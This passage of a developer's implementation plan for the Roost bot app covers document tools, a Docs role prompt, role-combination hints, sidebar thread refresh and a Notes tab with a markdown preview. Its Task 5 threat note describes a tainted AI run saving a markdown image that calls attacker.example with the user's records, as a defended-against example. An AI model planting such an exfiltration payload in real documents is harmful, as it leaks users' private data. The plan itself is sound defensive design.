    if meta is None:
        return ToolOutcome("Refused: that document is gone.", tainted=found.meta.tainted)
    return ToolOutcome(f"{verb} “{_escape(found.meta.title)}” (revision {meta.revision}).", tainted=found.meta.tainted)


class DocumentTools:
    names = frozenset(_ACTIVITY)

    def __init__(self, service: DocumentService) -> None:
        self._service = service

    def activity(self, name: str) -> str:
        return _ACTIVITY[name]

    async def run(self, name: str, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        handlers = {
            "list_documents": self._list, "read_document": self._read, "create_doc": self._create_doc,
            "create_sheet": self._create_sheet, "append_to_doc": self._append, "update_sheet_cells": self._cells,
            "delete_document": self._delete, "make_pdf_from_doc": self._make_pdf,
        }
        try:
            return await handlers[name](arguments, ctx)
        except ValidationError:
            return ToolOutcome(f"Refused: {name} needs {_NEEDS[name]}.")
        except RevisionConflict:
            return ToolOutcome(CHANGED_WHILE_WRITING_TEXT)
        except ValueError as exc:   # a damaged blob, a bad A1 reference, PdfError
            return ToolOutcome(f"Refused: {_escape(str(exc))}")

    async def _list(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        metas = await self._service.list(ctx.user_id, ListDocumentsArgs.model_validate(arguments).kind)
        shown = metas[:DOCUMENT_LIST_LIMIT]
        return ToolOutcome(document_list_text(shown, len(metas)), tainted=any(meta.tainted for meta in shown))

    async def _read(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        found = await self._find(ctx.user_id, DocumentRefArgs.model_validate(arguments).document, change=False)
        if isinstance(found, ToolOutcome):
            return found
        text = await self._service.text(found)
        return ToolOutcome(f"{document_line(found.meta)} revision={found.meta.revision}\n\n{_escape(text)}",
                           tainted=found.meta.tainted)

    async def _create_doc(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = CreateDocArgs.model_validate(arguments)
        meta = await self._service.create_doc(ctx.user_id, _title(args.title, "Untitled doc"), args.markdown,
                                              created_by_bot=ctx.bot_id, tainted=ctx.tainted)
        return ToolOutcome(f"Created doc: {document_line(meta)}. It's on the Board's Documents tab.", created=True)

    async def _create_sheet(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = CreateSheetArgs.model_validate(arguments)
        meta = await self._service.create_sheet(ctx.user_id, _title(args.title, "Untitled sheet"), args.rows,
                                                created_by_bot=ctx.bot_id, tainted=ctx.tainted)
        return ToolOutcome(f"Created sheet: {document_line(meta)} with {len(args.rows)} rows.", created=True)

    async def _append(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = AppendToDocArgs.model_validate(arguments)
        found = await self._find_kind(ctx.user_id, args.document, "doc")
        if isinstance(found, ToolOutcome):
            return found
        return _saved(found, await self._service.append_markdown(ctx.user_id, found, args.markdown), "Added to")

    async def _cells(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = UpdateSheetCellsArgs.model_validate(arguments)
        found = await self._find_kind(ctx.user_id, args.document, "sheet")
        if isinstance(found, ToolOutcome):
            return found
        edits = [{"cell": edit.cell.upper(), "value": edit.value, "formula": edit.formula} for edit in args.cells]
        return _saved(found, await self._service.set_cells(ctx.user_id, found, edits), f"Updated {len(edits)} cells in")

    async def _delete(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        found = await self._find(ctx.user_id, DocumentRefArgs.model_validate(arguments).document, change=True)
        if isinstance(found, ToolOutcome):
            return found
        await self._service.delete(ctx.user_id, found.meta.id)
        return ToolOutcome(f"Deleted: “{_escape(found.meta.title)}”.", tainted=found.meta.tainted)

    async def _make_pdf(self, arguments: dict[str, Any], ctx: RecordContext) -> ToolOutcome:
        args = MakePdfArgs.model_validate(arguments)
        found = await self._find_kind(ctx.user_id, args.document, "doc")
        if isinstance(found, ToolOutcome):
            return found
        meta = await self._service.make_pdf(ctx.user_id, found, _title(args.title, found.meta.title),
                                            created_by_bot=ctx.bot_id, tainted=ctx.tainted)
        return ToolOutcome(f"Created PDF: {document_line(meta)}", created=True, tainted=found.meta.tainted)

    async def _find_kind(self, user_id: str, ref: str, kind: str) -> Document | ToolOutcome:
        found = await self._find(user_id, ref, change=True)
        if isinstance(found, ToolOutcome) or found.meta.kind == kind:
            return found
        return ToolOutcome(f"Refused: “{_escape(found.meta.title)}” is a {KIND_LABEL[found.meta.kind]}, "
                           f"not a {KIND_LABEL[kind]}.", tainted=found.meta.tainted)

    async def _find(self, user_id: str, ref: str, *, change: bool) -> Document | ToolOutcome:
        match = _match(await self._service.list(user_id), ref, change)
        if isinstance(match, ToolOutcome):
            return match
        document = await self._service.get(user_id, match.id)
        return document if document is not None else ToolOutcome("Refused: that document is gone.")
```

- [ ] **Step 6: The Docs role, catalog, wiring**

`roost/bots/roles/docs.md`:

```markdown
---
id: docs
name: Docs
description: Keeps your documents, spreadsheets and PDFs, and writes, reads and updates them.
tools: [list_documents, read_document, create_doc, create_sheet, append_to_doc, update_sheet_cells, delete_document, make_pdf_from_doc]
board_tab: documents
needs_desk: false
---
You keep the user's documents: docs written in markdown, sheets of rows and cells, and PDFs. These belong to the user and every bot with this role shares them, so never say you cannot see them. When asked to save something in a document, gather it with your other roles' tools first, then write it. Before you change or delete a document, name it exactly; if two match, ask which.
```

In `roost/bots/roles.py`: `board_tab: Literal["tasks", "money", "notes", "documents"] | None = None`.

In `roost/talk/tool_catalog.py`: `from roost.documents.tool_specs import DOCUMENT_TOOL_DEFS`, and add `*DOCUMENT_TOOL_DEFS,` after `*NOTE_TOOL_DEFS,` in `CATALOG`.

In `roost/talk/domain_tools.py`, inside `build_domain_tools`, add local imports `from roost.documents.service import DocumentService`, `from roost.documents.store import DocumentStore` and `from roost.documents.tools import DocumentTools`. Add `DocumentTools(DocumentService(DocumentStore(config), events))` as the last handler in the returned `DomainTools((...))`.

- [ ] **Step 7: Roles that work together (D3)** — in `roost/talk/instructions.py` add:

```python
# M2 D3: a bot that holds a reading role and a writing role uses both in one
# request — the cure for "I'm isolated". Each hint shows only when the bot
# holds both of its tools.
_COMBINATIONS: tuple[tuple[frozenset[str], str], ...] = (
    (frozenset({"list_tasks", "create_doc"}),
     "to save the user's tasks in a document, call list_tasks, then create_doc with one line per task "
     "(status all includes the done ones)"),
    (frozenset({"list_expenses", "create_sheet"}),
     "for a sheet of expenses, call list_expenses for the month, then create_sheet with a header row and one "
     "row per expense"),
    (frozenset({"find_notes", "create_doc"}),
     "to turn notes into a document, call find_notes and read_note, then create_doc"),
    (frozenset({"read_document", "add_note"}),
     "to note what a document says, call read_document, then add_note"),
)
# The tools that read the user's records, with the role that holds each. The
# bots the user already has hold tasks and finance but not docs, and the deploy
# adds no role, so a reader without docs hands what it gathered to the docs
# holder (ask_bot takes a role id, M1 D5).
_READERS: tuple[tuple[str, str], ...] = (("list_tasks", "tasks"), ("list_expenses", "finance"), ("find_notes", "notes"))
_PAGED_TOOLS = frozenset({"list_tasks", "list_expenses"})
_PAGING_TEXT = (
    "A listing that ends with “…and N more: call again with offset=K” is not everything: repeat the call with "
    "that offset until nothing more is listed, then write them all."
)
_NO_DOCS_TEXT = (
    "No teammate keeps documents: when asked to save records in a document, tell the user the Docs role can be "
    "added on your Desk (Roles card)."
)
_NO_DOCS_LEAD_TEXT = (
    "No teammate keeps documents: when asked to save records in a document, suggest_bot an Office bot (roles "
    "tasks, finance, notes and docs), or tell the user the Docs role can be added to a bot on its Desk (Roles card)."
)


def _either(words: list[str]) -> str:
    return words[0] if len(words) == 1 else f"{', '.join(words[:-1])} or {words[-1]}"


def _together(tools: frozenset[str]) -> str | None:
    hints = [hint for needed, hint in _COMBINATIONS if needed <= tools]
    if not hints:
        return None
    return ("Your roles work together: in one request, read with one role's tools and write with another's. "
            "For example: " + "; ".join(hints) + ". These records are all the user's, so never say one role's "
            "records are out of reach of another.")


def _hand_over(tools: frozenset[str], team_roles: frozenset[str], lead: bool) -> str | None:
    """For a bot without the docs role: hand the records to the teammate that
    has it, or tell the user where the Docs role is added."""
    readers = [tool for tool, _ in _READERS if tool in tools]
    keepers = [role for _, role in _READERS if role in team_roles]
    if "create_doc" in tools or not (readers or lead):
        return None
    if "docs" not in team_roles:
        return _NO_DOCS_LEAD_TEXT if lead else _NO_DOCS_TEXT
    if readers:
        return ("Records you read can go into a document without the docs role: to save them in a document, "
                f"gather them with {_either(readers)}, then ask_bot docs with the full content and a title.")
    if keepers:
        return (f"To save the user's records in a document, ask_bot the role that keeps them ({_either(keepers)}) "
                "for the full list, then ask_bot docs with that list and a title.")
    return None


def _combine_section(roles: tuple[RoleDef, ...], teammates: tuple[Teammate, ...] = (), *,
                     lead: bool = False) -> str | None:
    tools = frozenset(tool for role in roles for tool in role.tools)
    team_roles = frozenset(role for teammate in teammates for role in teammate.roles)
    parts = tuple(part for part in (_together(tools), _hand_over(tools, team_roles, lead)) if part)
    paging = (_PAGING_TEXT,) if parts and tools & _PAGED_TOOLS else ()
    return " ".join((*parts, *paging)) or None
```

In `build_instructions`, insert `_combine_section(roles, teammates, lead=bot.is_primary and room is None),` right after `_roles_section(roles),`. `lead` is the same condition `_SUGGEST_TEXT` uses, so the main bot is offered `suggest_bot` exactly when the hint names it. A non-main bot's hints never mention `suggest_bot` (`test_the_main_bot_is_told_it_may_suggest_a_bot` still holds).

- [ ] **Step 8: Presets** — in `roost/bots/presets.py` add, and reorder `PRESETS`:

```python
OFFICE = BotPreset(
    id="office", label="Office", name="Office", job="Keeps your tasks, money, notes and documents together",
    instructions="", avatar=Avatar(shape="wide", color="#f59e0b", badge="docs"),
    roles=("tasks", "finance", "notes", "docs"),
)
WRITER = BotPreset(
    id="writer", label="Writer", name="Writer", job="Keeps your notes and documents", instructions="",
    avatar=Avatar(shape="tall", color="#8b5cf6", badge="notes"), roles=("notes", "docs"),
)
PRESETS: tuple[BotPreset, ...] = (LIFE_ADMIN, OFFICE, WRITER, RESEARCHER, CHIEF_PRESET)
```

Also update the module docstring: "New-bot presets (M1 D1, M2 D3)".

- [ ] **Step 9: Run the tests to see them pass**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest tests/test_document_tools.py tests/test_instructions.py tests/test_presets.py tests/test_suggest_bot.py tests/test_roles.py tests/test_gate.py tests/test_roles_api.py tests/test_task_tools.py tests/test_money_tools.py tests/test_role_routing.py -q`
Expected: PASS. M1's task and money tool tests still pass unchanged: a listing of 50 or fewer has no tail, and an empty one still says "No tasks match." / "No expenses match.".

- [ ] **Step 10: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build)
git -C /Users/blckit/Desktop/Code_Projects/roost add roost/documents/tool_args.py roost/documents/tool_specs.py \
  roost/documents/tools.py roost/bots/roles/docs.md roost/bots/roles.py roost/bots/presets.py \
  roost/talk/tool_catalog.py roost/talk/domain_tools.py roost/talk/instructions.py roost/records/paging.py \
  roost/tasks/tools.py roost/tasks/format.py roost/tasks/tool_specs.py roost/money/tools.py roost/money/tool_specs.py \
  tests/test_document_tools.py tests/test_instructions.py tests/test_presets.py tests/test_suggest_bot.py
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "feat: docs role tools, roles that work together (paged listings, hand-over to the docs role), Writer and Office presets"
```

---

### Task 4: The sidebar's Threads list follows new threads live (D6), and the main-bundle budget

Implements **D6**. Today the sidebar loads a bot's threads once, while Talk creates that bot's first thread (and "New conversation" creates another) in parallel, so the list keeps saying "No threads yet". After this task, Talk announces every thread it creates, and Layout also reloads when a live message names a thread it hasn't listed. This task also records the main-bundle budget **before** M2's web changes (D4: at most ~150 KB gzip of growth).

**Files:**
- Create: `web/src/lib/threadsChanged.ts`, `web/src/hooks/useThreadRefresh.ts`, `web/scripts/check-bundle.mjs`, `web/bundle-budget.json` (generated)
- Modify: `web/src/components/Layout.tsx`, `web/src/pages/Talk.tsx`, `web/package.json` (`size` script)
- Modify tests: `web/tests/Layout.test.tsx`, `web/tests/Talk.test.tsx`

**Interfaces:**
- Consumes: `useLiveState().messagesByThread`, `threadsApi.listThreads`, `threadsApi.createThread`.
- Produces:
  - `announceThreadsChanged(botId)` and `onThreadsChanged(listener) => unsubscribe`.
  - `useThreadRefresh(botId, threads, liveThreadIds, reload)`.
  - `npm run size`, plus `bundle-budget.json` with `{baseline_gzip_bytes, max_gzip_bytes}`.

- [ ] **Step 1: Path guard** (as Task 1 Step 1).

- [ ] **Step 2: Record the main-bundle baseline first (before any web change in M2)**

`web/scripts/check-bundle.mjs`:

```js
// The main bundle's budget (M2 D4): the entry chunk may grow by at most
// ~150 KB gzip over its size at the start of M2 — heavy editors load lazily.
// `node scripts/check-bundle.mjs --baseline` records the budget once (M2
// Task 4); `npm run size` checks it after every build.
import { readFileSync, writeFileSync } from "node:fs";
import { gzipSync } from "node:zlib";

const GROWTH_ALLOWED_BYTES = 150 * 1024;
const dist = new URL("../dist/", import.meta.url);
const budgetFile = new URL("../bundle-budget.json", import.meta.url);

function entryGzipBytes() {
  const html = readFileSync(new URL("index.html", dist), "utf8");
  const entry = /<script[^>]+src="\/(assets\/index-[^"]+\.js)"/.exec(html)?.[1];
  if (!entry) throw new Error("No entry script in dist/index.html — run `npm run build` first.");
  return { entry, bytes: gzipSync(readFileSync(new URL(entry, dist))).length };
}

const { entry, bytes } = entryGzipBytes();
if (process.argv.includes("--baseline")) {
  const budget = { baseline_gzip_bytes: bytes, max_gzip_bytes: bytes + GROWTH_ALLOWED_BYTES };
  writeFileSync(budgetFile, `${JSON.stringify(budget, null, 2)}\n`);
  console.log(`baseline ${entry}: ${bytes} B gzip; budget ${budget.max_gzip_bytes} B`);
} else {
  const { max_gzip_bytes: max } = JSON.parse(readFileSync(budgetFile, "utf8"));
  console.log(`entry ${entry}: ${bytes} B gzip (budget ${max} B)`);
  if (bytes > max) {
    console.error("Over the main-bundle budget: load the new code lazily (React.lazy).");
    process.exit(1);
  }
}
```

In `web/package.json` `scripts`, add `"size": "node scripts/check-bundle.mjs"`.

```bash
cd /Users/blckit/Desktop/Code_Projects/roost/web && npm run build && node scripts/check-bundle.mjs --baseline && npm run size
cat bundle-budget.json   # baseline ≈ 100–110 KB gzip at cb63e82; max = baseline + 153600
```

- [ ] **Step 3: Write the failing tests**

In `web/tests/Layout.test.tsx`:
- Replace the `useLiveStore` mock with a mutable one: `let liveState = { cursor: 0, bots: {}, messagesByThread: {} as Record<string, unknown[]>, streaming: {} };` and `vi.mock("../src/hooks/useLiveStore", () => ({ useLiveState: () => liveState }));`.
- Reset `liveState` to that value in `beforeEach`.
- Add `act` to the `@testing-library/react` import, and `import { announceThreadsChanged } from "../src/lib/threadsChanged";` and `import type { ThreadOut } from "../src/api/types";`.
- Append:

```tsx
const THREAD: ThreadOut = { id: "t-1", bot_id: "bot-1", title: null, kind: "chat", created_at: "x", updated_at: "x" };

function botTree() {
  return (
    <MemoryRouter initialEntries={["/bots/bot-1"]}>
      <Routes>
        <Route element={<Layout />}>
          <Route path="/bots/:botId" element={<p>Talk content</p>} />
        </Route>
      </Routes>
    </MemoryRouter>
  );
}

describe("Layout — the Threads list follows new threads (M2 D6)", () => {
  it("lists a new bot's first thread as soon as Talk announces it", async () => {
    listBotsMock.mockResolvedValue([SCOUT]);
    listThreadsMock.mockResolvedValueOnce([]).mockResolvedValue([THREAD]);
    render(botTree());
    expect(await screen.findByText("No threads yet.")).toBeInTheDocument();
    act(() => announceThreadsChanged("bot-1"));
    expect(await screen.findByRole("link", { name: "Untitled thread" })).toBeInTheDocument();
  });

  it("ignores an announcement for another bot", async () => {
    listBotsMock.mockResolvedValue([SCOUT]);
    listThreadsMock.mockResolvedValue([]);
    render(botTree());
    expect(await screen.findByText("No threads yet.")).toBeInTheDocument();
    act(() => announceThreadsChanged("bot-2"));
    await waitFor(() => expect(listThreadsMock).toHaveBeenCalledTimes(1));
  });

  it("reloads once when a live message names a thread it hasn't listed", async () => {
    listBotsMock.mockResolvedValue([SCOUT]);
    listThreadsMock.mockResolvedValueOnce([]).mockResolvedValue([THREAD]);
    const { rerender } = render(botTree());
    expect(await screen.findByText("No threads yet.")).toBeInTheDocument();
    liveState = { ...liveState, messagesByThread: { "t-1": [] } };
    rerender(botTree());
    expect(await screen.findByRole("link", { name: "Untitled thread" })).toBeInTheDocument();
    rerender(botTree());
    await waitFor(() => expect(listThreadsMock).toHaveBeenCalledTimes(2));
  });
});
```

In `web/tests/Talk.test.tsx` add `import { onThreadsChanged } from "../src/lib/threadsChanged";` and, in `describe("Talk — thread selection", …)`:

```tsx
  it("tells the sidebar about the first thread it creates for a new bot (M2 D6)", async () => {
    listThreadsMock.mockResolvedValue([]);
    createThreadMock.mockResolvedValue(NEW_THREAD);
    const heard: string[] = [];
    const stop = onThreadsChanged((botId) => heard.push(botId));
    renderTalk();
    await waitFor(() => expect(heard).toEqual(["bot-1"]));
    stop();
  });

  it("tells the sidebar about a New conversation too", async () => {
    listThreadsMock.mockResolvedValue([OLD_THREAD]);
    createThreadMock.mockResolvedValue(NEW_THREAD);
    const heard: string[] = [];
    const stop = onThreadsChanged((botId) => heard.push(botId));
    const user = userEvent.setup();
    renderTalk();
    await user.click(await screen.findByRole("button", { name: "New conversation" }));
    await waitFor(() => expect(heard).toEqual(["bot-1"]));
    stop();
  });
```

- [ ] **Step 4: Run them to see them fail**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost/web && npx vitest run tests/Layout.test.tsx tests/Talk.test.tsx`
Expected: FAIL. `../src/lib/threadsChanged` can't be resolved.

- [ ] **Step 5: Implement**

`web/src/lib/threadsChanged.ts`:

```ts
// The sidebar loads a bot's threads once per bot. A thread made in place —
// Talk's first thread for a new bot, "New conversation" — is announced here,
// so Layout reloads that bot's threads at once (M2 D6), the way teamChanged
// works for bots.
const THREADS_CHANGED = "roost:threads-changed";

export function announceThreadsChanged(botId: string): void {
  window.dispatchEvent(new CustomEvent<string>(THREADS_CHANGED, { detail: botId }));
}

export function onThreadsChanged(listener: (botId: string) => void): () => void {
  const handler = (event: Event) => listener((event as CustomEvent<string>).detail);
  window.addEventListener(THREADS_CHANGED, handler);
  return () => window.removeEventListener(THREADS_CHANGED, handler);
}
```

`web/src/hooks/useThreadRefresh.ts`:

```ts
import { useEffect, useRef } from "react";
import type { ThreadOut } from "../api/types";
import { onThreadsChanged } from "../lib/threadsChanged";

// M2 D6: the sidebar's Threads list follows the open bot's threads live. It
// reloads when Talk announces a thread, and when a live message names a thread
// the list hasn't seen (a handoff's "From <asker>" thread, a reply in a thread
// made elsewhere). Each unknown thread id triggers one reload, never a loop.
export function useThreadRefresh(
  botId: string | undefined,
  threads: readonly ThreadOut[],
  liveThreadIds: readonly string[],
  reload: () => void,
): void {
  useEffect(() => onThreadsChanged((changed) => {
    if (changed === botId) reload();
  }), [botId, reload]);

  const asked = useRef<ReadonlySet<string>>(new Set());
  useEffect(() => {
    if (!botId) return;
    const known = new Set(threads.map((thread) => thread.id));
    const fresh = liveThreadIds.filter((id) => !known.has(id) && !asked.current.has(id));
    if (fresh.length === 0) return;
    asked.current = new Set([...asked.current, ...fresh]);
    reload();
  }, [botId, threads, liveThreadIds, reload]);
}
```

In `web/src/components/Layout.tsx`:
- Import `useMemo` and `useThreadRefresh`.
- Give `useSidebarData` a third parameter, `liveThreadIds: readonly string[]`, and call `useThreadRefresh(botId, threads, liveThreadIds, loadThreads);` right after the `useEffect(() => { loadThreads(); }, [loadThreads]);`.
- In `Layout`, move `const live = useLiveState();` above the `useSidebarData` call, and add `const liveThreadIds = useMemo(() => Object.keys(live.messagesByThread), [live.messagesByThread]);`.
- Pass `liveThreadIds` as the third argument.

In `web/src/pages/Talk.tsx`, import `announceThreadsChanged` from `"../lib/threadsChanged"`, then:
- In `useNewConversation`, call `announceThreadsChanged(botId);` right after `const created = await threadsApi.createThread(botId);`.
- Add above `Talk`:

```tsx
// The first thread of a new bot is made here, while Layout's sidebar is
// already loading — tell it (M2 D6), or it keeps saying "No threads yet".
async function createAnnouncedThread(botId: string): Promise<ThreadOut> {
  const created = await threadsApi.createThread(botId);
  announceThreadsChanged(botId);
  return created;
}
```

- In `load`, replace `?? (await threadsApi.createThread(botId))` with `?? (await createAnnouncedThread(botId))`.

- [ ] **Step 6: Run the tests to see them pass**

Run: `cd /Users/blckit/Desktop/Code_Projects/roost/web && npx vitest run tests/Layout.test.tsx tests/Talk.test.tsx`
Expected: PASS (all existing Layout and Talk tests too).

- [ ] **Step 7: Full gates and commit**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost && uv run pytest --cov=roost --cov-fail-under=80 -q && (cd web && npm test && npm run build && npm run size)
git -C /Users/blckit/Desktop/Code_Projects/roost add web/src/lib/threadsChanged.ts web/src/hooks/useThreadRefresh.ts \
  web/src/components/Layout.tsx web/src/pages/Talk.tsx web/scripts/check-bundle.mjs web/bundle-budget.json \
  web/package.json web/tests/Layout.test.tsx web/tests/Talk.test.tsx
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "fix: the sidebar lists a bot's new thread right away"
```

---

### Task 5: Web — the Board's Notes tab (harvest LazyClaw's note helpers)

Implements **D4**'s Notes tab: a search box, the list, a markdown editor with a preview, wikilink chips, autosave with a revision check, and live reloads on `notes_changed`. It's a lazy chunk, so the main bundle barely grows. The components follow LazyClaw's notes UI (edit/preview, `[[link]]` chips through `#wikilink/` hrefs, relative times), restyled with Roost's tokens.

The preview keeps M1's link-safety rule (`MessageRow.tsx` `renderBody`: a link shows its real hostname, and remote images are never rendered). react-markdown's default elements would break it. They would draw `![x](https://host/…)` as an `<img>` that the browser fetches the moment Preview opens, and show link text the note's author chose. Here is why that matters. A tainted run may still create a note (M1 D3), and it can have read the user's records (`find_notes`, `list_tasks`). It could save `![](https://attacker.example/c?d=<records>)`, and previewing the note would send the records out, with no tool doing anything outbound. So:
- `img` renders as the text `[image: alt]`.
- A link that isn't a wikilink renders the M1 way: its text is `new URL(href).hostname` (`lib/linkHost.ts`, now shared with `renderBody`), with `target=_blank rel=noopener noreferrer`. A non-http(s) link is plain text.
- A malformed `#wikilink/%E0%A4` href falls back to plain text. A `decodeURIComponent` throw must never crash the Notes tab.
- Defense in depth: the SPA is served with `Content-Security-Policy: img-src 'self' data: blob:` (`roost/gateway/routes/static.py`). Today the gateway sends no CSP, and the web app draws no remote image anywhere.

**Files:**
- Create (harvest, Step 3): `web/src/components/notes/wikilink.ts`, `web/src/components/notes/noteHelpers.ts`
- Create: `web/src/api/conflict.ts`, `web/src/api/notes.ts`, `web/src/components/board/ConflictNotice.tsx`, `web/src/components/notes/useNoteDraft.ts`, `web/src/components/notes/NotePreview.tsx`, `web/src/components/notes/WikilinkChips.tsx`, `web/src/components/notes/NoteEditor.tsx`, `web/src/components/notes/NoteList.tsx`, `web/src/components/notes/NotesBoard.tsx`, `web/src/styles/notes.css`
- Create tests: `web/tests/conflict.test.ts`, `web/tests/noteText.test.ts`, `web/tests/NoteEditor.test.tsx`, `web/tests/NotesBoard.test.tsx`
- Create: `web/src/lib/linkHost.ts`
- Modify: `web/package.json`, `web/package-lock.json` (react-markdown, remark-gfm), `web/src/api/client.ts`, `web/src/api/types.ts`, `web/src/store/live.ts`, `web/src/components/board/boardTabs.ts`, `web/src/pages/Board.tsx`, `web/src/styles.css`, `web/src/components/MessageRow.tsx` (`renderBody` uses `linkHost`)
- Modify (Python): `roost/gateway/routes/static.py` (the CSP header), `roost/constants.py` (`SPA_CONTENT_SECURITY_POLICY`)
- Modify tests: `web/tests/live.test.ts`, `web/tests/Board.test.tsx`, `tests/test_static.py`

**Interfaces:**
- Consumes: Task 1's routes and shapes (`NoteSummaryOut`, `NoteOut`, the 409 body, `notes_changed`); `WebContentChip`, `ErrorNotice`, `useLiveState`, `describeError`.
- Produces:
  - Error handling: `ApiError(status, message, body?)`, `apiUpload(path, file, contentType)`, `RevisionConflictError<T>(current)`, `withConflict<T, C>(request)`.
  - Notes API: `listNotes(query?)`, `getNote(id)`, `createNote(input)`, `saveNote(id, input)` (throws `RevisionConflictError<NoteOut>`), `keepNote(id)`, `deleteNote(id)`.
  - `ConflictNotice({what, onLoad, onKeep})`, reused by Task 6.
  - `relativeTimeAgo(iso)`, reused by Task 6.
  - Live store: `boardVersion.notes`.
  - The Board: `BoardTab` gains `"notes"`, and a `lazyPanel(Panel)` helper in `Board.tsx`.
  - `linkHost(href)`: an http(s) URL's hostname, or `null` when it isn't a link to draw (M1's rule, one place).
  - The SPA's `Content-Security-Policy: img-src 'self' data: blob:` header.

- [ ] **Step 1: Path guard** (as Task 1 Step 1), and the disk guard: `df -g /System/Volumes/Data | awk 'NR==2{print $4}'` ≥ 8.

- [ ] **Step 2: Dependencies (MIT), verified**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost/web && npm install --save-exact react-markdown@10.1.0 remark-gfm@4.0.1
node -e '
const { execSync } = require("node:child_process");
const before = JSON.parse(execSync("git show HEAD:web/package-lock.json", { encoding: "utf8", maxBuffer: 1e9 })).packages;
const after = require("./package-lock.json").packages;
const added = Object.entries(after).filter(([path]) => path && !(path in before));
const counts = {};
for (const [, meta] of added) counts[meta.license ?? "NO LICENSE FIELD"] = (counts[meta.license ?? "NO LICENSE FIELD"] ?? 0) + 1;
console.log(added.length, "new packages", JSON.stringify(counts));
for (const [path, meta] of added) if (!/^(MIT|ISC|Apache-2\.0|BSD-2-Clause|BSD-3-Clause|0BSD)$/.test(meta.license ?? "")) console.log("CHECK", path, meta.license);'
```

Expected: every new package is MIT or ISC, and nothing prints `CHECK`. If a `CHECK` line appears, stop and report it.

- [ ] **Step 3: Harvest — verbatim copies with provenance headers, then commit them**

```bash
cd /Users/blckit/Desktop/Code_Projects/roost/web && mkdir -p src/components/notes
LCW=/Users/blckit/Desktop/Code_Projects/lazyclaw/web
hdr() { printf '// SPDX-License-Identifier: MIT\n// Harvested from LazyClaw %s @ 21e1002, adapted for Roost\n\n' "$1"; }
{ hdr "web/src/lib/wikilink.ts"; cat "$LCW/src/lib/wikilink.ts"; } > src/components/notes/wikilink.ts
{ hdr "web/src/components/notes/noteHelpers.ts lines 56-88, 142-149"; sed -n '56,88p;142,149p' "$LCW/src/components/notes/noteHelpers.ts"; } > src/components/notes/noteHelpers.ts
npm run build
git -C /Users/blckit/Desktop/Code_Projects/roost add web/src/components/notes/wikilink.ts web/src/components/notes/noteHelpers.ts
git -C /Users/blckit/Desktop/Code_Projects/roost commit -m "harvest: copy LazyClaw's wikilink parser and note time helpers for the web"
```

(The `package.json`/lock change from Step 2 is committed with the task's final commit; stage only the two harvested files here.)

- [ ] **Step 4: Write the failing tests**

`web/tests/conflict.test.ts`:

```ts
import { afterEach, describe, expect, it, vi } from "vitest";
import { ApiError, apiRequest } from "../src/api/client";
import { RevisionConflictError, withConflict } from "../src/api/conflict";

afterEach(() => vi.unstubAllGlobals());

describe("errors that carry the stored copy (M2 D4)", () => {
  it("keeps the error body on ApiError", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response(JSON.stringify({ detail: "changed", current: { id: "n1" } }),
      { status: 409, headers: { "Content-Type": "application/json" } })));
    await expect(apiRequest("PUT", "/api/notes/n1", {})).rejects.toMatchObject({
      status: 409, message: "changed", body: { current: { id: "n1" } },
    });
  });

  it("turns a 409 that carries the current copy into a RevisionConflictError", async () => {
    const failing = Promise.reject(new ApiError(409, "changed", { detail: "changed", current: { id: "n1", revision: 3 } }));
    const caught = await withConflict(failing).catch((err: unknown) => err);
    expect(caught).toBeInstanceOf(RevisionConflictError);
    expect((caught as RevisionConflictError<{ revision: number }>).current.revision).toBe(3);
  });

  it("passes any other error, and a success, through", async () => {
    await expect(withConflict(Promise.reject(new ApiError(404, "Note not found")))).rejects.toBeInstanceOf(ApiError);
    await expect(withConflict(Promise.resolve(1))).resolves.toBe(1);
  });
});
```

`web/tests/noteText.test.ts`:

```ts
import { describe, expect, it } from "vitest";
import { parseWikilinks } from "../src/components/notes/wikilink";
import { deriveTitle, normalizePage, stripFrontMatter } from "../src/components/notes/noteHelpers";
import { withWikilinkHrefs } from "../src/components/notes/NotePreview";

describe("note text helpers", () => {
  it("parses [[target#anchor|display]] links and embeds", () => {
    expect(parseWikilinks("see [[Ana|my friend]] and ![[Garden#roses]]").map((l) => [l.kind, l.target, l.anchor, l.display]))
      .toEqual([["plain", "Ana", "", "my friend"], ["embed", "Garden", "roses", ""]]);
  });

  it("folds a page name the way the server does", () => {
    expect(normalizePage("  Ana   García ")).toBe("ana garcía");
  });

  it("drops a leading front-matter block and nothing else", () => {
    expect(stripFrontMatter("---\ntags: [a]\n---\n# Ana")).toBe("# Ana");
    expect(stripFrontMatter("# Ana\n---\nx")).toBe("# Ana\n---\nx");
  });

  it("derives a title from the first line", () => {
    expect(deriveTitle("Buy milk\nand eggs")).toBe("Buy milk");
  });

  it("turns wikilinks into links the preview draws as chips", () => {
    expect(withWikilinkHrefs("see [[Ana|my friend]] now")).toBe("see [my friend](#wikilink/Ana) now");
  });
});
```

`web/tests/NoteEditor.test.tsx`:

```tsx
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { NoteEditor } from "../src/components/notes/NoteEditor";
import { RevisionConflictError } from "../src/api/conflict";
import type { NoteOut } from "../src/api/types";

const getNoteMock = vi.fn();
const saveNoteMock = vi.fn();
vi.mock("../src/api/notes", () => ({
  getNote: (...a: unknown[]) => getNoteMock(...a),
  saveNote: (...a: unknown[]) => saveNoteMock(...a),
}));

function note(overrides: Partial<NoteOut> = {}): NoteOut {
  return {
    id: "n1", title: "Ana", tags: ["people"], snippet: "", pinned: false, revision: 1, created_at: "x", updated_at: "x",
